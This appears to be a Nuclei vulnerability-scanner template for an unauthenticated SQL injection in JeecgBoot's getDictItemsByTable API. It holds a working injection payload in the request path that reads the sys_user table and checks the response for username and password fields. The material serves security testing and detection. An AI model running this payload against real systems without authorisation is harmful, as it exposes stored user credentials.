id: jeecg-boot-getDictItemsByTable-sqli

info:
  name: JeecgBoot SQL Injection Vulnerability
  author: xxx
  severity: high
  tags: cve,cve2025,jeecgboot,sqli,sql-injection,unauthenticated
variables:
  test_value: "{{randstr}}"

http:
  - raw:
      - |
        GET /api/sys/ng-alain/getDictItemsByTable/'%20from%20sys_user/*,%20'/x.js HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
        Accept: application/json, text/plain, */*
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate
        Connection: close

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'username'
          - 'password'
      - type: status
        status: 
          - 200
